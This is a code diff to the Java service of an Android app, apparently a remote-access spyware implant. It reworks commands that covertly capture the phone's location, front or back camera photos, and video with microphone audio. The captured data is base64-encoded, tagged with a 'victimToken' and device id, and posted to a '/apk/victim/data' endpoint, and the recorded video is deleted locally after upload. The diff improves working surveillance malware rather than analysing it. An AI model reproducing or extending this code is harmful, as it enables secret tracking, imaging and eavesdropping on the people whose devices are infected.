@@ -934,94 +934,47 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // Location
+    // ★★★ Location — محدّث بـ LocationHelper ★★★
     // ============================================================
     private void sendLocation() {
-        try {
-            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-            if (lm == null) {
-                reportCommandResult("get_location", "fail", "no_lm");
-                return;
-            }
+        Log.d(TAG, "sendLocation called");
 
-            if (!hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
-                    && !hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
-                reportCommandResult("get_location", "fail", "no_location_permission");
-                return;
-            }
-
-            Location loc = null;
-
-            try {
-                loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-                if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-                if (loc == null) loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
-            } catch (SecurityException se) {
-                reportCommandResult("get_location", "fail", "security_exception");
-                return;
-            }
-
-            if (loc == null) {
-                final CountDownLatch latch = new CountDownLatch(1);
-                final AtomicReference<Location> freshLoc = new AtomicReference<>(null);
-
-                LocationListener listener = new LocationListener() {
-                    @Override
-                    public void onLocationChanged(Location location) {
-                        freshLoc.set(location);
-                        latch.countDown();
-                    }
-                    @Override
-                    public void onStatusChanged(String provider, int status, Bundle extras) {}
-                    @Override
-                    public void onProviderEnabled(String provider) {}
-                    @Override
-                    public void onProviderDisabled(String provider) {}
-                };
-
+        LocationHelper.getLocation(this, new LocationHelper.LocationCallback2() {
+            @Override
+            public void onSuccess(double lat, double lng, float accuracy, String provider) {
                 try {
-                    if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                        lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, listener, Looper.getMainLooper());
-                    } else if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                        lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, listener, Looper.getMainLooper());
+                    JSONObject d = new JSONObject();
+                    d.put("type", "location");
+                    d.put("token", victimToken);
+                    d.put("device", deviceId);
+                    d.put("lat", lat);
+                    d.put("lng", lng);
+                    d.put("accuracy", accuracy);
+                    d.put("provider", provider);
+
+                    // عنوان (اختياري)
+                    String address = LocationHelper.getAddressFromLocation(
+                            ServiceRunner.this, lat, lng);
+                    if (address != null) {
+                        d.put("address", address);
                     }
 
-                    latch.await(15, TimeUnit.SECONDS);
+                    postJson("/apk/victim/data", d);
+                    reportCommandResult("get_location", "ok", "");
 
-                    try {
-                        lm.removeUpdates(listener);
-                    } catch (Exception e) {}
-
-                    loc = freshLoc.get();
+                    Log.d(TAG, "✅ Location: " + lat + ", " + lng + " | " + provider);
 
                 } catch (Exception e) {
-                    Log.e(TAG, "requestLocationUpdates error: " + e.getMessage());
+                    reportCommandResult("get_location", "fail", e.getMessage());
                 }
             }
 
-            JSONObject d = new JSONObject();
-            d.put("type", "location");
-            d.put("token", victimToken);
-            d.put("device", deviceId);
-
-            if (loc != null) {
-                d.put("lat", loc.getLatitude());
-                d.put("lng", loc.getLongitude());
-                d.put("accuracy", loc.getAccuracy());
-                d.put("provider", loc.getProvider());
-                postJson("/apk/victim/data", d);
-                reportCommandResult("get_location", "ok", "");
-                Log.d(TAG, "Location: " + loc.getLatitude() + ", " + loc.getLongitude());
-            } else {
-                d.put("lat", 0);
-                d.put("lng", 0);
-                postJson("/apk/victim/data", d);
-                reportCommandResult("get_location", "fail", "no_location");
+            @Override
+            public void onError(String error) {
+                Log.e(TAG, "location error: " + error);
+                reportCommandResult("get_location", "fail", error);
             }
-
-        } catch (Exception e) {
-            reportCommandResult("get_location", "fail", e.getMessage());
-        }
+        });
     }
 
     private void sendClipboard() {
@@ -1050,104 +1003,46 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // Camera
+    // ★★★ Camera — محدّث بـ CameraHelper ★★★
     // ============================================================
     private void takePicture(final int cameraId) {
-        new Thread(() -> {
-            try {
-                if (!hasPermission(android.Manifest.permission.CAMERA)) {
-                    reportCommandResult("camera_" + (cameraId == 1 ? "front" : "back"),
-                            "fail", "no_camera_permission");
-                    return;
+        Log.d(TAG, "takePicture called: cameraId=" + cameraId + " (0=back, 1=front)");
+
+        boolean isFront = (cameraId == 1);
+        final String actionName = isFront ? "camera_front" : "camera_back";
+
+        CameraHelper.capturePhoto(this, isFront, new CameraHelper.PhotoCallback() {
+            @Override
+            public void onSuccess(byte[] jpegData) {
+                try {
+                    String base64 = Base64.encodeToString(jpegData, Base64.NO_WRAP);
+
+                    JSONObject d = new JSONObject();
+                    d.put("type", "camera_photo");
+                    d.put("token", victimToken);
+                    d.put("device", deviceId);
+                    d.put("camera_id", cameraId);
+                    d.put("camera_name", isFront ? "front" : "back");
+                    d.put("image", "data:image/jpeg;base64," + base64);
+                    d.put("size", jpegData.length);
+
+                    postJson("/apk/victim/data", d);
+                    reportCommandResult(actionName, "ok", "");
+
+                    Log.d(TAG, "✅ Photo captured: " + jpegData.length + " bytes");
+
+                } catch (Exception e) {
+                    Log.e(TAG, "send photo error: " + e.getMessage());
+                    reportCommandResult(actionName, "fail", "send: " + e.getMessage());
                 }
-
-                Handler mainHandler = new Handler(Looper.getMainLooper());
-                mainHandler.post(() -> {
-                    Camera camera = null;
-                    try {
-                        Log.d(TAG, "Opening camera: " + cameraId);
-                        camera = Camera.open(cameraId);
-
-                        if (camera == null) {
-                            reportCommandResult("camera_" + (cameraId == 1 ? "front" : "back"),
-                                    "fail", "camera_null");
-                            return;
-                        }
-
-                        Camera.Parameters params = camera.getParameters();
-
-                        try {
-                            List<Camera.Size> sizes = params.getSupportedPictureSizes();
-                            if (sizes != null && !sizes.isEmpty()) {
-                                Camera.Size best = null;
-                                for (Camera.Size s : sizes) {
-                                    if (s.width * s.height <= 1920 * 1080) {
-                                        if (best == null || s.width * s.height > best.width * best.height) {
-                                            best = s;
-                                        }
-                                    }
-                                }
-                                if (best != null) {
-                                    params.setPictureSize(best.width, best.height);
-                                }
-                            }
-                        } catch (Exception e) {}
-
-                        try { params.setPictureFormat(ImageFormat.JPEG); } catch (Exception e) {}
-                        try { params.setJpegQuality(85); } catch (Exception e) {}
-
-                        try {
-                            if (params.getSupportedFocusModes().contains(Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE)) {
-                                params.setFocusMode(Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE);
-                            }
-                        } catch (Exception e) {}
-
-                        camera.setParameters(params);
-
-                        try { camera.startPreview(); } catch (Exception e) {}
-
-                        final Camera finalCamera = camera;
-                        final String camName = (cameraId == 1) ? "camera_front" : "camera_back";
-
-                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                            try {
-                                finalCamera.takePicture(null, null, (data, cam) -> {
-                                    try {
-                                        String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
-                                        JSONObject d = new JSONObject();
-                                        d.put("type", "camera_photo");
-                                        d.put("token", victimToken);
-                                        d.put("device", deviceId);
-                                        d.put("camera_id", cameraId);
-                                        d.put("camera_name", cameraId == 1 ? "front" : "back");
-                                        d.put("image", "data:image/jpeg;base64," + base64);
-                                        postJson("/apk/victim/data", d);
-                                        reportCommandResult(camName, "ok", "");
-                                        Log.d(TAG, "✅ Photo sent: " + data.length + " bytes");
-                                    } catch (Exception e) {
-                                        reportCommandResult(camName, "fail", "send: " + e.getMessage());
-                                    } finally {
-                                        try { cam.release(); } catch (Exception ignored) {}
-                                    }
-                                });
-                            } catch (Exception e) {
-                                reportCommandResult(camName, "fail", "takePicture: " + e.getMessage());
-                                try { finalCamera.release(); } catch (Exception ignored) {}
-                            }
-                        }, 1500);
-
-                    } catch (Exception e) {
-                        Log.e(TAG, "takePicture: " + e.getMessage());
-                        reportCommandResult("camera_" + (cameraId == 1 ? "front" : "back"),
-                                "fail", e.getMessage());
-                        if (camera != null) try { camera.release(); } catch (Exception ignored) {}
-                    }
-                });
-
-            } catch (Exception e) {
-                Log.e(TAG, "takePicture thread error: " + e.getMessage());
             }
-        }).start();
+
+            @Override
+            public void onError(String error) {
+                Log.e(TAG, "camera error: " + error);
+                reportCommandResult(actionName, "fail", error);
+            }
+        });
     }
 
     private void recordAudio(final int durationMs) {
@@ -1217,10 +1112,206 @@ public class ServiceRunner extends Service {
         }).start();
     }
 
+    // ============================================================
+    // ★★★ Video — محدّث بـ Camera2 ★★★
+    // ============================================================
     private void recordVideo(final int cameraId, final int durationMs) {
+        Log.d(TAG, "recordVideo called: cameraId=" + cameraId + " duration=" + durationMs);
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            recordVideoCamera2(cameraId, durationMs);
+        } else {
+            recordVideoLegacy(cameraId, durationMs);
+        }
+    }
+
+    @androidx.annotation.RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
+    private void recordVideoCamera2(final int cameraId, final int durationMs) {
         new Thread(() -> {
-            Camera camera = null;
-            MediaRecorder recorder = null;
+            android.hardware.camera2.CameraDevice camera = null;
+            android.media.MediaRecorder recorder = null;
+            String filePath = null;
+            android.os.HandlerThread thread = null;
+
+            try {
+                if (!hasPermission(android.Manifest.permission.CAMERA)) {
+                    reportCommandResult("camera_record", "fail", "no_camera_permission");
+                    return;
+                }
+
+                android.hardware.camera2.CameraManager manager =
+                        (android.hardware.camera2.CameraManager) getSystemService(Context.CAMERA_SERVICE);
+
+                if (manager == null) {
+                    reportCommandResult("camera_record", "fail", "no_camera_manager");
+                    return;
+                }
+
+                // ابحث عن الكاميرا
+                String targetCameraId = null;
+                boolean isFront = (cameraId == 1);
+
+                for (String id : manager.getCameraIdList()) {
+                    android.hardware.camera2.CameraCharacteristics chars =
+                            manager.getCameraCharacteristics(id);
+                    Integer facing = chars.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING);
+
+                    if (facing != null) {
+                        if (isFront && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT) {
+                            targetCameraId = id;
+                            break;
+                        }
+                        if (!isFront && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK) {
+                            targetCameraId = id;
+                            break;
+                        }
+                    }
+                }
+
+                if (targetCameraId == null) {
+                    String[] ids = manager.getCameraIdList();
+                    if (ids.length > 0) targetCameraId = ids[0];
+                }
+
+                if (targetCameraId == null) {
+                    reportCommandResult("camera_record", "fail", "no_camera");
+                    return;
+                }
+
+                final String finalCameraId = targetCameraId;
+
+                // Handler Thread
+                thread = new android.os.HandlerThread("VideoThread");
+                thread.start();
+                final android.os.Handler handler = new android.os.Handler(thread.getLooper());
+
+                filePath = getExternalCacheDir() + "/video_" + System.currentTimeMillis() + ".mp4";
+
+                recorder = new android.media.MediaRecorder();
+                recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC);
+                recorder.setVideoSource(android.media.MediaRecorder.VideoSource.SURFACE);
+                recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4);
+                recorder.setVideoEncoder(android.media.MediaRecorder.VideoEncoder.H264);
+                recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC);
+                recorder.setVideoSize(1280, 720);
+                recorder.setVideoFrameRate(30);
+                recorder.setVideoEncodingBitRate(5000000);
+                recorder.setOutputFile(filePath);
+                recorder.prepare();
+
+                android.view.Surface surface = recorder.getSurface();
+                final java.util.concurrent.CountDownLatch openLatch = new java.util.concurrent.CountDownLatch(1);
+                final java.util.concurrent.CountDownLatch sessionLatch = new java.util.concurrent.CountDownLatch(1);
+                final android.media.MediaRecorder finalRecorder = recorder;
+
+                manager.openCamera(finalCameraId, new android.hardware.camera2.CameraDevice.StateCallback() {
+                    @Override
+                    public void onOpened(@androidx.annotation.NonNull android.hardware.camera2.CameraDevice cam) {
+                        Log.d(TAG, "Camera opened for video");
+                        try {
+                            android.hardware.camera2.params.OutputConfiguration config =
+                                    new android.hardware.camera2.params.OutputConfiguration(surface);
+
+                            cam.createCaptureSession(
+                                    java.util.Collections.singletonList(config),
+                                    new android.hardware.camera2.CameraCaptureSession.StateCallback() {
+                                        @Override
+                                        public void onConfigured(@androidx.annotation.NonNull android.hardware.camera2.CameraCaptureSession s) {
+                                            try {
+                                                android.hardware.camera2.CaptureRequest.Builder builder =
+                                                        cam.createCaptureRequest(android.hardware.camera2.CameraDevice.TEMPLATE_RECORD);
+                                                builder.addTarget(surface);
+                                                s.setRepeatingRequest(builder.build(), null, handler);
+
+                                                Log.d(TAG, "Recording started");
+                                                finalRecorder.start();
+                                                sessionLatch.countDown();
+                                            } catch (Exception e) {
+                                                Log.e(TAG, "session config error: " + e.getMessage());
+                                                sessionLatch.countDown();
+                                            }
+                                        }
+
+                                        @Override
+                                        public void onConfigureFailed(@androidx.annotation.NonNull android.hardware.camera2.CameraCaptureSession s) {
+                                            sessionLatch.countDown();
+                                        }
+                                    },
+                                    handler
+                            );
+                        } catch (Exception e) {
+                            Log.e(TAG, "createCaptureSession error: " + e.getMessage());
+                            sessionLatch.countDown();
+                        }
+                        openLatch.countDown();
+                    }
+
+                    @Override
+                    public void onDisconnected(@androidx.annotation.NonNull android.hardware.camera2.CameraDevice cam) {
+                        try { cam.close(); } catch (Exception e) {}
+                    }
+
+                    @Override
+                    public void onError(@androidx.annotation.NonNull android.hardware.camera2.CameraDevice cam, int error) {
+                        openLatch.countDown();
+                        sessionLatch.countDown();
+                        try { cam.close(); } catch (Exception e) {}
+                    }
+                }, handler);
+
+                openLatch.await(10, java.util.concurrent.TimeUnit.SECONDS);
+                sessionLatch.await(10, java.util.concurrent.TimeUnit.SECONDS);
+
+                Thread.sleep(durationMs);
+
+                try { recorder.stop(); } catch (Exception e) {}
+                try { recorder.release(); } catch (Exception e) {}
+                recorder = null;
+
+                File videoFile = new File(filePath);
+                if (!videoFile.exists() || videoFile.length() == 0) {
+                    reportCommandResult("camera_record", "fail", "file_empty");
+                    return;
+                }
+
+                FileInputStream fis = new FileInputStream(videoFile);
+                byte[] bytes = new byte[(int) videoFile.length()];
+                int read = fis.read(bytes);
+                fis.close();
+
+                if (read <= 0) {
+                    reportCommandResult("camera_record", "fail", "read_failed");
+                    return;
+                }
+
+                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+                JSONObject d = new JSONObject();
+                d.put("type", "video_record");
+                d.put("token", victimToken);
+                d.put("device", deviceId);
+                d.put("video", "data:video/mp4;base64," + base64);
+                d.put("duration", durationMs);
+                d.put("size", bytes.length);
+                postJson("/apk/victim/data", d);
+                reportCommandResult("camera_record", "ok", "");
+                Log.d(TAG, "✅ Video recorded: " + bytes.length + " bytes");
+
+                videoFile.delete();
+
+            } catch (Exception e) {
+                Log.e(TAG, "recordVideoCamera2 error: " + e.getMessage());
+                reportCommandResult("camera_record", "fail", e.getMessage());
+                if (recorder != null) try { recorder.release(); } catch (Exception ignored) {}
+                if (camera != null) try { camera.close(); } catch (Exception ignored) {}
+                if (thread != null) try { thread.quitSafely(); } catch (Exception ignored) {}
+            }
+        }).start();
+    }
+
+    private void recordVideoLegacy(final int cameraId, final int durationMs) {
+        new Thread(() -> {
+            android.hardware.Camera camera = null;
+            android.media.MediaRecorder recorder = null;
             String filePath = null;
             try {
                 if (!hasPermission(android.Manifest.permission.CAMERA)) {
@@ -1228,7 +1319,7 @@ public class ServiceRunner extends Service {
                     return;
                 }
 
-                camera = Camera.open(cameraId);
+                camera = android.hardware.Camera.open(cameraId);
                 if (camera == null) {
                     reportCommandResult("camera_record", "fail", "camera_null");
                     return;
@@ -1236,13 +1327,13 @@ public class ServiceRunner extends Service {
                 camera.unlock();
 
                 filePath = getExternalCacheDir() + "/video_" + System.currentTimeMillis() + ".mp4";
-                recorder = new MediaRecorder();
+                recorder = new android.media.MediaRecorder();
                 recorder.setCamera(camera);
-                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-                recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
-                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-                recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
-                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+                recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC);
+                recorder.setVideoSource(android.media.MediaRecorder.VideoSource.CAMERA);
+                recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4);
+                recorder.setVideoEncoder(android.media.MediaRecorder.VideoEncoder.H264);
+                recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC);
                 recorder.setVideoSize(640, 480);
                 recorder.setVideoFrameRate(20);
                 recorder.setVideoEncodingBitRate(800000);
@@ -1620,4 +1711,4 @@ public class ServiceRunner extends Service {
     private void postJson(String path, JSONObject data) {
         postJsonWithResponse(path, data);
     }
-                }
+    }
